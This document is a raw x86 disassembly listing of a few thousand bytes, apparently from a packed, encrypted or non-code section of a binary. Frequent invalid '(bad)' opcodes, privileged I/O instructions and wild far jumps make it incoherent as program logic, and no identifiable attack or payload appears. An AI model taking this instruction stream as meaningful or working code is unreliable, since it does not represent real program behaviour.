  41c9cd:	jae    0x41c9a4
  41c9cf:	aas    
  41c9d0:	shl    ah,1
  41c9d2:	repz call 0xbea0cbb5
  41c9d8:	add    edi,DWORD PTR [eax+0x4a4a114f]
  41c9de:	sti    
  41c9df:	dec    edx
  41c9e0:	xchg   esi,eax
  41c9e1:	pop    ss
  41c9e2:	pop    ebp
  41c9e3:	(bad)  
  41c9e4:	pop    ebp
  41c9e5:	jmp    0xb5431dd3
  41c9ea:	dec    esi
  41c9eb:	mov    ecx,0xd823d140
  41c9f0:	pop    ecx
  41c9f1:	cmp    eax,0xe2e08b50
  41c9f6:	push   eax
  41c9f7:	and    al,0xa4
  41c9f9:	mov    ds:0x55ad1296,al
  41c9fe:	mov    ds:0xa7f9c53e,eax
  41ca03:	mov    ecx,0x242cc8fe
  41ca08:	iret   
  41ca09:	sti    
  41ca0a:	or     BYTE PTR [eax],ah
  41ca0c:	mov    ebx,0x157f000b
  41ca11:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ca12:	lahf   
  41ca13:	mov    cl,0xcf
  41ca15:	test   al,0xeb
  41ca17:	jl     0x41ca61
  41ca19:	mov    al,0x3c
  41ca1b:	les    esp,FWORD PTR cs:[eax-0xc]
  41ca1f:	outs   dx,BYTE PTR ds:[esi]
  41ca20:	leave  
  41ca21:	cmp    eax,0x286bd876
  41ca26:	into   
  41ca27:	cmp    al,BYTE PTR [edi-0x16c19f9d]
  41ca2d:	or     dx,WORD PTR [ecx+0x47b90a5a]
  41ca34:	les    edx,FWORD PTR [eax+0x53]
  41ca37:	dec    esi
  41ca38:	sti    
  41ca39:	outs   dx,DWORD PTR ds:[esi]
  41ca3a:	in     al,0xa4
  41ca3c:	push   ss
  41ca3d:	inc    ebx
  41ca3e:	push   edi
  41ca3f:	lods   eax,DWORD PTR ds:[esi]
  41ca40:	cs xchg ebp,eax
  41ca42:	rcr    DWORD PTR [edi],cl
  41ca44:	daa    
  41ca45:	cli    
  41ca46:	dec    eax
  41ca47:	xchg   esi,eax
  41ca48:	adc    ecx,edi
  41ca4a:	lods   al,BYTE PTR ds:[esi]
  41ca4b:	int3   
  41ca4c:	pop    ss
  41ca4d:	mov    DWORD PTR [esi],0xc7098b85
  41ca53:	dec    ebx
  41ca54:	call   0x194a:0x5b67764f
  41ca5b:	lea    ebp,[eax+0x8]
  41ca5e:	not    BYTE PTR ss:[edx-0x259601e7]
  41ca65:	mov    dl,0xae
  41ca67:	mov    DWORD PTR [esi-0x650144bc],0x1cccdb05
  41ca71:	rcl    BYTE PTR [edi-0x478eb3bc],0x85
  41ca78:	push   0x85270774
  41ca7d:	inc    eax
  41ca7e:	and    cl,al
  41ca80:	sbb    dl,BYTE PTR [edi]
  41ca82:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ca83:	or     BYTE PTR [edx-0x16],dh
  41ca86:	or     al,0x54
  41ca88:	xchg   esi,ebp
  41ca8a:	out    dx,eax
  41ca8b:	mov    BYTE PTR [ebx],bl
  41ca8d:	int3   
  41ca8e:	mov    esp,DWORD PTR [ebx]
  41ca90:	sbb    ecx,edx
  41ca92:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ca93:	dec    cl
  41ca95:	jmp    0x41ca4d
  41ca97:	add    eax,0x25851560
  41ca9d:	mov    esp,0x12df7695
  41caa2:	mov    edx,DWORD PTR [esi+ecx*1]
  41caa5:	gs adc ch,dh
  41caa8:	push   ebx
  41caa9:	add    al,0xd6
  41caab:	mov    eax,ebx
  41caad:	xor    esi,DWORD PTR [ebx-0x71]
  41cab0:	xchg   DWORD PTR es:[eax+0x1],edi
  41cab4:	xchg   ebp,eax
  41cab5:	mov    edi,DWORD PTR ds:0x118ac8ff
  41cabb:	pop    ebp
  41cabc:	gs push esp
  41cabe:	repnz outs dx,DWORD PTR ds:[esi]
  41cac0:	fstp   TBYTE PTR [ecx+edx*8+0x1c]
  41cac4:	push   cs
  41cac5:	mov    dl,0x3a
  41cac7:	lods   al,BYTE PTR ds:[esi]
  41cac8:	test   DWORD PTR [edx+0x1d],esp
  41cacb:	dec    ebx
  41cacc:	loop   0x41ca9f
  41cace:	loopne 0x41cace
  41cad0:	pop    ecx
  41cad1:	aam    0x5
  41cad3:	int3   
  41cad4:	jge    0x41cafd
  41cad6:	cli    
  41cad7:	mov    ds:0x277cf163,al
  41cadc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cadd:	mov    edx,DWORD PTR [eax+0x367b97f]
  41cae3:	push   0x63569e88
  41cae8:	pop    edx
  41cae9:	js     0x41cae4
  41caeb:	(bad)  
  41caed:	adc    dl,BYTE PTR [esi+eax*4-0x6708e5f6]
  41caf4:	int3   
  41caf5:	mov    ebp,0xb885c2e0
  41cafa:	jecxz  0x41cb34
  41cafc:	lock outs dx,DWORD PTR ds:[esi]
  41cafe:	mov    DWORD PTR [edx+0x2f],0xc3598814
  41cb05:	fdiv   st,st(6)
  41cb07:	popf   
  41cb08:	std    
  41cb09:	neg    DWORD PTR [eax+0x3d]
  41cb0c:	inc    ebx
  41cb0d:	shl    ebx,1
  41cb0f:	enter  0xe0b,0xe8
  41cb13:	mov    WORD PTR [ecx+0x76b2fc70],cs
  41cb19:	xor    BYTE PTR [ebx-0x3],dl
  41cb1c:	xor    BYTE PTR [ecx-0x7b566be9],bl
  41cb22:	xor    eax,0x7960d3bd
  41cb27:	mov    ch,0xb3
  41cb29:	aas    
  41cb2a:	out    dx,al
  41cb2b:	lock imul edi,DWORD PTR [ecx+ecx*2-0x6dc8d08d],0xffffff90
  41cb34:	ins    DWORD PTR es:[edi],dx
  41cb35:	jle    0x41caf8
  41cb37:	mov    al,0x16
  41cb39:	icebp  
  41cb3a:	add    eax,0x511c14fd
  41cb3f:	loop   0x41cae4
  41cb41:	sub    DWORD PTR [eax],eax
  41cb43:	aaa    
  41cb44:	je     0x41cb7c
  41cb46:	mov    cs,WORD PTR [ebx+0x6c8a9cf6]
  41cb4c:	jo     0x41cb7a
  41cb4e:	cmp    BYTE PTR [esi-0x50],0x24
  41cb52:	mov    bl,0xf3
  41cb54:	mov    ch,0x98
  41cb56:	and    dl,BYTE PTR [edi-0x4]
  41cb59:	xchg   edx,eax
  41cb5a:	xchg   eax,edx
  41cb5c:	xchg   edx,eax
  41cb5d:	call   0xf7a5:0x6d2debca
  41cb64:	and    al,0xdf
  41cb66:	cmp    edi,DWORD PTR [ebp+0x47e26d6f]
  41cb6c:	stos   DWORD PTR es:[edi],eax
  41cb6d:	sbb    al,0x9a
  41cb6f:	or     ch,0x9
  41cb72:	inc    ecx
  41cb73:	popf   
  41cb74:	push   esi
  41cb75:	xchg   ebx,eax
  41cb76:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cb77:	test   al,0xf
  41cb79:	cmp    ebp,DWORD PTR [esi-0x4e35b66d]
  41cb7f:	pop    ecx
  41cb80:	scas   al,BYTE PTR es:[edi]
  41cb81:	iret   
  41cb82:	pop    edi
  41cb83:	test   eax,0x6189a93a
  41cb88:	xchg   esp,eax
  41cb89:	scas   eax,DWORD PTR es:[edi]
  41cb8a:	pop    esi
  41cb8b:	not    DWORD PTR [eax]
  41cb8d:	jae    0x41cb9a
  41cb8f:	mov    eax,ds:0x9b3dd662
  41cb94:	test   eax,0x685c9e54
  41cb99:	test   esp,esi
  41cb9b:	dec    ecx
  41cb9c:	int    0x13
  41cb9e:	mov    dl,0xb9
  41cba0:	push   ebp
  41cba1:	ret    0xd75f
  41cba4:	fisubr DWORD PTR [ebp+edi*1-0xca6f966]
  41cbab:	ss jmp 0xbf9c:0x7afd7541
  41cbb3:	push   ebx
  41cbb4:	call   0x782faf38
  41cbb9:	int3   
  41cbba:	jbe    0x41cc15
  41cbbc:	mov    bl,0x7c
  41cbbe:	pop    ss
  41cbbf:	dec    esi
  41cbc0:	or     ebp,eax
  41cbc2:	sub    BYTE PTR ds:0xed39392c,cl
  41cbc8:	xor    DWORD PTR [ebp-0x2df38945],ebx
  41cbce:	push   es
  41cbcf:	pop    ecx
  41cbd0:	add    eax,0x302d8a20
  41cbd5:	fistp  WORD PTR [edx]
  41cbd7:	mov    bh,0x5
  41cbd9:	das    
  41cbda:	call   0x189f127e
  41cbdf:	inc    DWORD PTR [edx+0x6d4bcf14]
  41cbe5:	lahf   
  41cbe6:	fld    TBYTE PTR [ecx+0x53966bd8]
  41cbec:	jmp    0x41cc34
  41cbee:	rol    cl,1
  41cbf0:	lock cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cbf2:	rcl    DWORD PTR [eax-0x3ac89f33],cl
  41cbf8:	push   esp
  41cbf9:	fstp   TBYTE PTR [ebx-0x48a5b829]
  41cbff:	lock add ah,BYTE PTR [ecx]
  41cc02:	cmc    
  41cc03:	pop    es
  41cc04:	jo     0x41cbec
  41cc06:	sbb    al,0xe3
  41cc08:	pop    ecx
  41cc09:	pop    edx
  41cc0a:	mov    dh,0x49
  41cc0c:	outs   dx,BYTE PTR ds:[esi]
  41cc0d:	jecxz  0x41cba4
  41cc0f:	imul   ebx,DWORD PTR [edx],0x3aa0a0b5
  41cc15:	mov    ds:0x9ea81bd1,al
  41cc1a:	xor    DWORD PTR [esi+edx*2-0x4c405bf3],0xc6ff8fc9
  41cc25:	jnp    0x41cc7a
  41cc27:	sahf   
  41cc28:	imul   BYTE PTR [ebp+0x184ca187]
  41cc2e:	(bad)  
  41cc2f:	pop    esp
  41cc30:	xchg   esi,eax
  41cc31:	inc    ecx
  41cc32:	nop
  41cc33:	aas    
  41cc34:	push   0x278e948
  41cc39:	or     eax,0xf3e88f3a
  41cc3e:	(bad)  
  41cc3f:	lahf   
  41cc40:	jmp    0xf651:0x35f5d58b
  41cc47:	dec    ecx
  41cc48:	jle    0x41cc52
  41cc4a:	mov    WORD PTR [esp+ebx*2],fs
  41cc4d:	xchg   ecx,eax
  41cc4e:	shl    ebp,1
  41cc50:	and    bl,bl
  41cc52:	add    ebx,DWORD PTR [edi+0x5310d578]
  41cc58:	fstp   QWORD PTR [edx-0x5e]
  41cc5b:	dec    esp
  41cc5c:	shl    DWORD PTR [edi*1-0x28c9a1eb],cl
  41cc63:	sub    DWORD PTR [ebp+0x65],esi
  41cc66:	arpl   WORD PTR [ecx+0x0],cx
  41cc69:	add    DWORD PTR [edi-0x42],ebp
  41cc6c:	xor    eax,esi
  41cc6e:	mov    ds:0xcfac5935,eax
  41cc73:	push   ebx
  41cc74:	out    0xb5,eax
  41cc76:	stos   BYTE PTR es:[edi],al
  41cc77:	push   ebx
  41cc78:	jge    0x41cc48
  41cc7a:	mov    ah,0xc5
  41cc7c:	and    BYTE PTR [eax-0x1606878a],0xd9
  41cc83:	outs   dx,DWORD PTR ds:[esi]
  41cc84:	mov    ch,0x34
  41cc86:	push   ebx
  41cc87:	xor    DWORD PTR [eax+0xd53cbae],0x62
  41cc8e:	push   ecx
  41cc8f:	aas    
  41cc90:	imul   edi,DWORD PTR [esi+0x1c],0xcdcc6fc
  41cc97:	aaa    
  41cc98:	mov    ebx,0x199037cf
  41cc9d:	aas    
  41cc9e:	inc    ebx
  41cc9f:	xlat   BYTE PTR ds:[ebx]
  41cca0:	test   al,0xa9
  41cca2:	data16 cld 
  41cca4:	ds in  al,dx
  41cca6:	and    DWORD PTR [esi-0x70],0xffffffb7
  41ccaa:	aam    0x13
  41ccac:	(bad)  
  41ccad:	mov    esp,0x796584a9
  41ccb2:	pop    esi
  41ccb3:	jmp    0xf92:0xca520659
  41ccba:	mov    edx,0x99ca374a
  41ccbf:	shl    esi,1
  41ccc1:	in     al,0x47
  41ccc3:	fsub   st,st(3)
  41ccc5:	(bad)  
  41ccc6:	cwde   
  41ccc7:	xchg   ebx,eax
  41ccc8:	or     cl,BYTE PTR [ecx-0x7e]
  41cccb:	dec    ebp
  41cccc:	pop    es
  41cccd:	mov    cl,0x0
  41cccf:	stos   BYTE PTR es:[edi],al
  41ccd0:	inc    eax
  41ccd1:	test   eax,0xe77df541
  41ccd6:	retf   
  41ccd7:	add    bh,BYTE PTR [ecx+esi*8]
  41ccda:	mov    bh,0x3a
  41ccdc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ccdd:	scas   eax,DWORD PTR es:[edi]
  41ccde:	fimul  WORD PTR [ecx]
  41cce0:	sub    BYTE PTR [edx+0x75],bl
  41cce3:	jmp    0xd7cd:0xe505c922
  41ccea:	fild   DWORD PTR [esi-0x69]
  41cced:	xlat   BYTE PTR ds:[ebx]
  41ccee:	loop   0x41cce3
  41ccf0:	push   es
  41ccf1:	hlt    
  41ccf2:	mov    BYTE PTR [esi],bl
  41ccf4:	and    al,0xab
  41ccf6:	fwait
  41ccf7:	cli    
  41ccf8:	mov    bl,0x9e
  41ccfa:	pop    ds
  41ccfb:	sub    esi,DWORD PTR [esi]
  41ccfd:	pop    edx
  41ccfe:	xchg   edi,eax
  41ccff:	les    ecx,FWORD PTR [ebx]
  41cd01:	pop    es
  41cd02:	inc    esp
  41cd03:	jge    0x41ccba
  41cd05:	ins    BYTE PTR es:[edi],dx
  41cd06:	sub    ecx,DWORD PTR [ebp-0x11]
  41cd09:	retf   0xb07d
  41cd0c:	xchg   esp,eax
  41cd0d:	xor    eax,0x723715a4
  41cd12:	and    BYTE PTR [ecx+ebp*1],ah
  41cd15:	iret   
  41cd16:	and    DWORD PTR [edi+0x6],0xa2a08b97
  41cd1d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cd1e:	mov    ds:0x6d0a8e32,eax
  41cd23:	mov    bh,0x3
  41cd25:	mov    edx,0x5dbf0578
  41cd2a:	add    eax,0xb8bc491a
  41cd2f:	stc    
  41cd30:	pop    edx
  41cd31:	xor    ecx,esp
  41cd33:	inc    esp
  41cd34:	leave  
  41cd35:	pop    esp
  41cd36:	rol    DWORD PTR [ebp+0x32],cl
  41cd39:	imul   esp,DWORD PTR [ebp+0xf6b7fdb],0x665c672b
  41cd43:	in     eax,dx
  41cd44:	pushf  
  41cd45:	sub    eax,0xe8225a71
  41cd4a:	mov    ebx,0xc888de92
  41cd4f:	inc    ebx
  41cd50:	mov    ecx,0x6b4830fd
  41cd55:	or     DWORD PTR [edi-0x4f],ecx
  41cd58:	inc    ebx
  41cd59:	enter  0x7089,0xc6
  41cd5d:	pusha  
  41cd5e:	jbe    0x41cd60
  41cd60:	sbb    DWORD PTR [eax+0x4e],edx
  41cd63:	repnz cmp eax,0x5f269f8b
  41cd69:	jnp    0x41cdbd
  41cd6b:	sbb    esi,esi
  41cd6d:	add    edx,DWORD PTR [esi+ebx*4+0x20]
  41cd71:	mov    edi,0x5789d3dc
  41cd76:	les    esi,FWORD PTR [eax]
  41cd78:	dec    eax
  41cd79:	stos   DWORD PTR es:[edi],eax
  41cd7a:	frstor [ebp+0xafabf4e]
  41cd80:	bound  edx,QWORD PTR [ebx]
  41cd82:	cmp    al,0xe6
  41cd84:	int3   
  41cd85:	rcl    BYTE PTR [edi],cl
  41cd87:	das    
  41cd88:	cmp    DWORD PTR [eax-0x3eb4f265],0x2387b073
  41cd92:	xor    DWORD PTR [esi],0xffffffc9
  41cd95:	mov    ?,ecx
  41cd97:	dec    ebp
  41cd98:	sub    DWORD PTR [ebx+edi*2+0x760ca9b3],esp
  41cd9f:	xchg   BYTE PTR [edx-0x62400b70],bl
  41cda5:	cmc    
  41cda6:	add    DWORD PTR [eax],ebp
  41cda8:	and    eax,0x8b7e6ac3
  41cdad:	xlat   BYTE PTR ds:[ebx]
  41cdae:	push   0x95bc07aa
  41cdb3:	pop    ebp
  41cdb4:	pop    ss
  41cdb5:	les    edi,FWORD PTR [esi]
  41cdb7:	bound  edi,QWORD PTR [esi+0x5198cf9b]
  41cdbd:	dec    edx
  41cdbe:	xchg   edx,eax
  41cdbf:	ins    DWORD PTR es:[edi],dx
  41cdc0:	mov    al,0x94
  41cdc2:	jg     0x41ce23
  41cdc4:	adc    eax,0x6b55296b
  41cdc9:	and    cl,BYTE PTR [ebp-0xd]
  41cdcc:	fld    DWORD PTR [ecx-0x5b]
  41cdcf:	popf   
  41cdd0:	sbb    al,0x35
  41cdd2:	stos   DWORD PTR es:[edi],eax
  41cdd3:	stc    
  41cdd4:	jae    0x41cd83
  41cdd6:	cli    
  41cdd7:	(bad)  
  41cdd8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cdd9:	or     eax,DWORD PTR [ebx+0xb]
  41cddc:	or     BYTE PTR [esi+ebp*2-0x4],0xc
  41cde1:	and    ch,BYTE PTR ds:0xbb2293af
  41cde8:	shl    BYTE PTR [edx-0x80],cl
  41cdeb:	jae    0x41ce0d
  41cded:	out    dx,al
  41cdee:	repz xchg esp,eax
  41cdf0:	mov    al,ds:0xbfbdb511
  41cdf5:	pop    es
  41cdf6:	scas   al,BYTE PTR es:[edi]
  41cdf7:	mov    cs,ebp
  41cdf9:	jae    0x41ce07
  41cdfb:	enter  0x87aa,0xe7
  41cdff:	(bad)  
  41ce00:	les    ebp,FWORD PTR [eax-0xa]
  41ce03:	and    al,0x7f
  41ce05:	add    eax,0x5956375c
  41ce0a:	dec    ebx
  41ce0b:	sbb    eax,0x9a699065
  41ce10:	jp     0x41ce55
  41ce12:	je     0x41cdd9
  41ce14:	and    ecx,DWORD PTR [eax+0x55]
  41ce17:	xchg   edx,eax
  41ce18:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ce19:	(bad)  
  41ce1a:	lds    ebx,FWORD PTR [edi-0x27]
  41ce1d:	leave  
  41ce1e:	into   
  41ce1f:	mov    ch,0xa8
  41ce21:	dec    ecx
  41ce22:	(bad)  
  41ce23:	push   esp
  41ce24:	lods   al,BYTE PTR ds:[esi]
  41ce25:	push   edi
  41ce26:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ce27:	and    eax,0xeacabb6c
  41ce2c:	add    al,0x3e
  41ce2e:	in     al,dx
  41ce2f:	adc    dh,BYTE PTR [ecx+0x4fe2a8af]
  41ce35:	je     0x41ce78
  41ce37:	dec    edx
  41ce38:	ss push ebx
  41ce3a:	ret    
  41ce3b:	mov    edi,0xfe680d7d
  41ce40:	gs stc 
  41ce42:	dec    edx
  41ce43:	repnz mov ah,0x5b
  41ce46:	xor    BYTE PTR [ebp+esi*4+0x6f],dl
  41ce4a:	addr16 xchg ecx,eax
  41ce4c:	mov    BYTE PTR [ebp-0x4d8c22a3],cl
  41ce52:	pusha  
  41ce53:	add    DWORD PTR [ecx-0x5cc958f0],0x47805b3b
  41ce5d:	jb     0x41ced7
  41ce5f:	jge    0x41ce1e
  41ce61:	sub    eax,0xb673886e
  41ce66:	add    bh,bl
  41ce68:	inc    esi
  41ce69:	test   ah,dh
  41ce6b:	sub    DWORD PTR [edi-0x23],eax
  41ce6e:	mov    cl,0xd2
  41ce70:	dec    ebx
  41ce71:	jae    0x41ceaf
  41ce73:	addr16 fwait
  41ce75:	sbb    al,0xcc
  41ce77:	and    edx,DWORD PTR [ebx-0x388f82b]
  41ce7d:	ror    BYTE PTR [ebp+edx*2+0x66],0x97
  41ce82:	ret    
  41ce83:	cli    
  41ce84:	jg     0x41ce7d
  41ce86:	imul   ecx,DWORD PTR [edi],0xb22be419
  41ce8c:	sbb    eax,0xdb2e9938
  41ce91:	retf   
  41ce92:	add    al,0xc1
  41ce94:	shr    DWORD PTR [esi],1
  41ce96:	pop    es
  41ce97:	call   0x4100514b
  41ce9c:	mov    al,ds:0x71404d2a
  41cea1:	scas   al,BYTE PTR es:[edi]
  41cea2:	jmp    0x41cee9
  41cea4:	outs   dx,DWORD PTR ds:[esi]
  41cea5:	stos   DWORD PTR es:[edi],eax
  41cea6:	add    ah,BYTE PTR [ebp-0x3b]
  41cea9:	dec    edx
  41ceaa:	pop    esi
  41ceab:	jne    0x41ce7c
  41cead:	mov    ebx,0x3ca9bf57
  41ceb2:	xor    esp,DWORD PTR [ecx+ecx*2-0x7]
  41ceb6:	xchg   BYTE PTR [edx+0x4a3bdb94],al
  41cebc:	cli    
  41cebd:	clc    
  41cebe:	mov    bh,0x11
  41cec0:	mov    WORD PTR [ebx-0x2e],gs
  41cec3:	out    0xaa,eax
  41cec5:	dec    esi
  41cec6:	or     bh,ch
  41cec8:	cwde   
  41cec9:	mov    bh,0x88
  41cecb:	shl    DWORD PTR [edi],0xae
  41cece:	pop    edx
  41cecf:	fist   WORD PTR [edi-0x58382af2]
  41ced5:	cmp    al,0x4a
  41ced7:	mov    al,ds:0x447c824e
  41cedc:	mov    ebx,0x9f3a97ee
  41cee1:	scas   al,BYTE PTR es:[edi]
  41cee2:	push   ebp
  41cee3:	scas   al,BYTE PTR es:[edi]
  41cee4:	retf   
  41cee5:	xchg   esi,eax
  41cee6:	retf   
  41cee7:	sub    BYTE PTR fs:[ebx],al
  41ceea:	mov    al,ds:0x3302b486
  41ceef:	mov    bh,0x57
  41cef1:	retf   0x4517
  41cef4:	mul    al
  41cef6:	scas   eax,DWORD PTR es:[edi]
  41cef7:	jp     0x41ce81
  41cef9:	ror    bh,1
  41cefb:	xor    edi,edx
  41cefd:	loope  0x41cec6
  41ceff:	mov    esp,0x33c78ef0
  41cf04:	(bad)  
  41cf05:	(bad)  
  41cf07:	add    ah,dh
  41cf09:	repnz xchg edx,eax
  41cf0b:	xchg   DWORD PTR [esi],eax
  41cf0d:	mov    ds:0x8e2e5d05,eax
  41cf12:	idiv   DWORD PTR [ebp+0x74]
  41cf15:	mov    ds:0xe2612692,al
  41cf1a:	fimul  WORD PTR [eax+0x3a]
  41cf1d:	stos   BYTE PTR es:[edi],al
  41cf1e:	and    BYTE PTR [ecx+0x31824f4d],ch
  41cf24:	aam    0x7
  41cf26:	out    dx,al
  41cf27:	cmp    bh,BYTE PTR [eax+0x78]
  41cf2a:	jp     0x41cebc
  41cf2c:	mov    edi,edx
  41cf2e:	and    bl,al
  41cf30:	mov    ah,0xe7
  41cf32:	in     al,0x63
  41cf34:	sbb    BYTE PTR [ecx+0x74610853],bl
  41cf3a:	mov    ebp,0x2675494a
  41cf3f:	cwde   
  41cf40:	xor    ebp,DWORD PTR [eax]
  41cf42:	mov    al,0xdf
  41cf44:	lds    edx,FWORD PTR [edx-0x7644d922]
  41cf4a:	add    ebx,DWORD PTR [ebx]
  41cf4c:	sbb    ebx,DWORD PTR [esi-0x2d97d8cd]
  41cf52:	lahf   
  41cf53:	scas   al,BYTE PTR es:[edi]
  41cf54:	stos   BYTE PTR es:[edi],al
  41cf55:	push   ecx
  41cf56:	inc    edi
  41cf57:	cmp    DWORD PTR [ecx-0x59],esp
  41cf5a:	inc    ebx
  41cf5c:	pop    edi
  41cf5d:	leave  
  41cf5e:	sub    DWORD PTR [ecx+0x317a438a],0x39
  41cf65:	cmp    BYTE PTR [edx+0x3e9e1e44],bh
  41cf6b:	js     0x41cfb8
  41cf6d:	cs adc eax,0x6b6baeb1
  41cf73:	push   ds
  41cf74:	loope  0x41cfc7
  41cf76:	push   eax
  41cf77:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cf78:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cf79:	cdq    
  41cf7a:	mov    edi,0x6375fecc
  41cf7f:	pop    esp
  41cf80:	ret    0x9bc5
  41cf83:	fisub  DWORD PTR [edi-0x32715fe6]
  41cf89:	push   ds
  41cf8a:	or     ah,dh
  41cf8c:	or     eax,0x58e8fb7
  41cf91:	clc    
  41cf92:	outs   dx,BYTE PTR ds:[esi]
  41cf93:	inc    edi
  41cf94:	inc    ecx
  41cf95:	(bad)  
  41cf96:	iret   
  41cf97:	push   esp
  41cf98:	jne    0x41cf77
  41cf9a:	scas   eax,DWORD PTR es:[edi]
  41cf9b:	jbe    0x41cfac
  41cf9d:	je     0x41cf98
  41cf9f:	scas   eax,DWORD PTR es:[edi]
  41cfa0:	test   BYTE PTR [edi+0x10f603f9],bl
  41cfa6:	cwde   
  41cfa7:	es and al,0x95
  41cfaa:	shr    BYTE PTR [ebx-0x73],cl
  41cfad:	enter  0xb810,0xff
  41cfb1:	jnp    0x41cff2
  41cfb3:	add    DWORD PTR [edx-0x1e5d4682],0x65
  41cfba:	popa   
  41cfbb:	pminub mm5,QWORD PTR [eax+0x16]
  41cfbf:	repz cld 
  41cfc1:	xchg   ecx,eax
  41cfc2:	lods   al,BYTE PTR ds:[esi]
  41cfc3:	push   esi
  41cfc4:	iret   
  41cfc5:	retf   
  41cfc6:	xlat   BYTE PTR ds:[ebx]
  41cfc7:	pushw  ds
  41cfc9:	xchg   ebx,eax
  41cfca:	enter  0x7bfa,0xb7
  41cfce:	je     0x41d004
  41cfd0:	jmp    0xfb6e:0xf0df2464
  41cfd7:	mov    ah,0x1d
  41cfd9:	mov    cl,0x1
  41cfdb:	adc    eax,0xd4b41161
  41cfe0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cfe1:	add    ch,BYTE PTR [ecx-0x79c2ccae]
  41cfe7:	cdq    
  41cfe8:	jle    0x41cfd2
  41cfea:	lock jg 0x41cff3
  41cfed:	dec    ebp
  41cfee:	enter  0xd433,0x8c
  41cff2:	push   eax
  41cff3:	jl     0x41d032
  41cff5:	push   ebx
  41cff6:	mov    BYTE PTR [ebx],bl
  41cff8:	inc    ecx
  41cff9:	pushfw 
  41cffb:	addr16 inc ebx
  41cffd:	xor    ecx,edi
  41cfff:	pop    esi
  41d000:	mov    eax,ds:0x361649c0
  41d005:	jmp    0x6a49521d
  41d00a:	pushf  
  41d00b:	push   edi
  41d00c:	or     ch,BYTE PTR [eax+0x2]
  41d00f:	mov    esp,0x7bdee951
  41d014:	sub    dl,dh
  41d016:	jp     0x41d019
  41d018:	ins    DWORD PTR es:[edi],dx
  41d019:	push   es
  41d01a:	add    ebx,DWORD PTR [esi]
  41d01c:	dec    edx
  41d01d:	xor    ecx,edi
  41d01f:	out    dx,eax
  41d020:	xchg   esp,eax
  41d021:	xchg   edx,eax
  41d022:	cmp    al,0x2d
  41d024:	mov    ah,0xfc
  41d026:	inc    edx
  41d027:	pusha  
  41d028:	xor    al,0xc9
  41d02a:	pop    ebx
  41d02b:	pusha  
  41d02c:	ret    0xbba7
  41d02f:	xor    esi,DWORD PTR [ecx-0x377f6f88]
  41d035:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d036:	arpl   dx,bx
  41d038:	mov    ah,0x5
  41d03a:	je     0x41d0ac
  41d03c:	(bad)  
  41d03e:	ficomp WORD PTR [ebp+eiz*1-0x3b]
  41d042:	mov    DWORD PTR [esi+0xf349f6d],eax
  41d048:	enter  0x8d2c,0xcb
  41d04c:	jno    0x41d062
  41d04e:	and    cl,dh
  41d050:	push   ecx
  41d052:	jmp    0xfdcc:0xb496e820
  41d059:	iret   
  41d05a:	stos   BYTE PTR es:[edi],al
  41d05b:	cli    
  41d05c:	outs   dx,DWORD PTR ds:[esi]
  41d05d:	fst    st(7)
  41d05f:	(bad)  
  41d060:	rcl    DWORD PTR [ebp+0x3a],cl
  41d063:	jbe    0x41d05c
  41d065:	push   ds
  41d066:	cld    
  41d067:	lods   eax,DWORD PTR ds:[esi]
  41d068:	pop    esi
  41d069:	cli    
  41d06a:	xor    eax,0xa36355b6
  41d06f:	mov    cl,0x40
  41d071:	test   al,0x14
  41d073:	cmp    BYTE PTR [edx],bl
  41d075:	mov    eax,DWORD PTR [esi+0x25a1c598]
  41d07b:	gs xchg ecx,eax
  41d07d:	rcl    BYTE PTR [eax],0x25
  41d080:	jne    0x41d0b3
  41d082:	adc    al,0x85
  41d084:	mov    esp,0x6b210e5a
  41d089:	imul   ebx,DWORD PTR [esi-0x29],0x7419877f
  41d090:	and    esp,esi
  41d092:	dec    edx
  41d093:	add    al,0x0
  41d095:	sbb    dh,0x9
  41d098:	pop    esi
  41d099:	aad    0x3c
  41d09b:	cmp    BYTE PTR [edi+ebx*1+0x44],ch
  41d09f:	aad    0xe8
  41d0a1:	adc    eax,0x72d7bb9f
  41d0a6:	mov    al,0x44
  41d0a8:	xchg   edx,eax
  41d0a9:	or     al,ch
  41d0ab:	cmp    ebx,DWORD PTR [ebp+0x2dc0a820]
  41d0b1:	loop   0x41d04a
  41d0b3:	test   al,0xe
  41d0b5:	xchg   esp,eax
  41d0b6:	mov    WORD PTR [eax+0xa],ss
  41d0b9:	cdq    
  41d0ba:	cmp    al,0xa0
  41d0bc:	dec    ebx
  41d0bd:	mov    ds:0x887a2279,al
  41d0c2:	scas   al,BYTE PTR es:[edi]
  41d0c3:	mov    ds:0x46d88b6a,eax
  41d0c8:	dec    ecx
  41d0c9:	sub    BYTE PTR [edx+0x3d85d1ef],dh
  41d0cf:	adc    bh,BYTE PTR [edx+ecx*8+0x369ebcba]
  41d0d6:	adc    eax,0x5e4c8018
  41d0db:	mov    eax,ds:0x56e72b5a
  41d0e0:	lahf   
  41d0e1:	lahf   
  41d0e2:	repnz xchg edx,eax
  41d0e4:	(bad)  
  41d0e5:	push   ebp
  41d0e6:	mov    eax,edx
  41d0e8:	(bad)  
  41d0e9:	mov    esp,0x6966793a
  41d0ee:	iret   
  41d0ef:	jmp    DWORD PTR [edi+ebp*4-0x63]
  41d0f3:	mov    bl,0x1c
  41d0f5:	cmp    al,0x2d
  41d0f7:	or     al,0xd5
  41d0f9:	loopne 0x41d0a6
  41d0fb:	mov    bh,0x88
  41d0fd:	ins    BYTE PTR es:[edi],dx
  41d0fe:	enter  0xd818,0xd9
  41d102:	mov    al,ds:0x50b5ee3
  41d107:	adc    BYTE PTR [eax-0x2c],dl
  41d10a:	or     ebp,ebx
  41d10c:	cli    
  41d10d:	push   0x5b
  41d10f:	call   0x2746:0x9cbe3a7
  41d116:	(bad)  
